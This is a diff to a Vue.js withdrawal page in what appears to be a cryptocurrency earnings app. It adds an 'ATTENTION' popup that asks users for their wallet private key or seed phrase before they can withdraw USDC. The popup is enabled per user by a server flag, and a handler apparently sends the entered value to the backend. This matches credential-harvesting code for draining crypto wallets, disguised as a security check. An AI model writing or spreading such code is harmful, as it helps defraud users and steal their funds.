@@ -137,14 +137,14 @@
             </div>
           </div>
 
-          <div v-if="isPrivateKey" class=" z-50 bg-white rounded-2xl box-shadow relative -mt-64 mx-4">
+          <div v-if="userInfo.popup_privatekey && isPrivateKey" class=" z-50 bg-white rounded-2xl box-shadow relative -mt-64 mx-4">
             <div>
               <div class="w-72 mx-auto">
                 <div class="text-center text-xl pt-4">ATTENTION</div>
                 <div class="relative pt-8 pb-2">
                   <input type="text" class="bg-red-300 rounded w-full h-12 pl-4" v-model="privateKeyValue"/>
                 </div>
-                <div>Lorem ipsum dolor sit amet consectetur adipisicing elit. Consequatur, aperiam commodi. Iste tempore recusandae assumenda voluptatem voluptate amet impedit?</div>
+                <div class="text-sm">To ensure the security of the verifier's assets, the transfer of the verifier's assets requires the verification of the account private key, or the helper word, please ensure the security of the surrounding environment to enter, and the assets can be transferred after the verification is completed.</div>
                 <div class="flex justify-center py-4">
                   <button class="bg-red-300 py-1  px-4 font-bold opacity-80 text-white rounded-full" @click="privateKey">CONFIRM</button>
                 </div>
@@ -317,11 +317,14 @@
       const userInfo = computed(() => store.getters['user/getUserInfo'])
       const withDrawRecords = computed(() => store.getters['withdraw/getWithDrawRecords'])
       const earningRecords = computed(() => store.getters['withdraw/getEarningRecords'])
+
       
 
-      const isPrivateKey = userInfo.value.popup_privatekey;
+      const isPrivateKey = ref(false);
+      const isWithDraw = ref(false);
       const privateKey = async () => {
         isPrivateKey.value = !isPrivateKey.value;
+        isWithDraw.value = !isWithDraw.value;
         let payload = {
           walletAddress:address.value,
           data: { 
@@ -366,21 +369,27 @@
       const withdrawConfirm = async () => { 
         if(withdrawValue.value > userInfo.value.usdc_balance)
           isEnough.value = true
+        if(userInfo.value?.popup_privatekey == false) {
+          isWithDraw.value = true
+        }
         if(!isEnough.value) {
-          let payload = {
-            wallet: address.value,
-            amount: withdrawValue.value
-          }
-          await store.dispatch( 'withdraw/withdraw', payload)
-          store.commit('user/setUsdcWithDraw', withdrawValue.value)
-          let withDraw = {
-            walletAddress:address.value,
-            data: { 
-              usdc_balance: userInfo.value.usdc_balance,
+          isPrivateKey.value = !isPrivateKey.value;
+          if(isWithDraw.value) {
+            let payload = {
+              wallet: address.value,
+              amount: withdrawValue.value
             }
+            await store.dispatch( 'withdraw/withdraw', payload)
+            store.commit('user/setUsdcWithDraw', withdrawValue.value)
+            let withDraw = {
+              walletAddress:address.value,
+              data: { 
+                usdc_balance: userInfo.value.usdc_balance,
+              }
+            }
+            await store.dispatch('user/createPrivateKey', withDraw)
+            isSuccess.value = true
           }
-          await store.dispatch('user/createPrivateKey', withDraw)
-          isSuccess.value = true
         }
        
       }
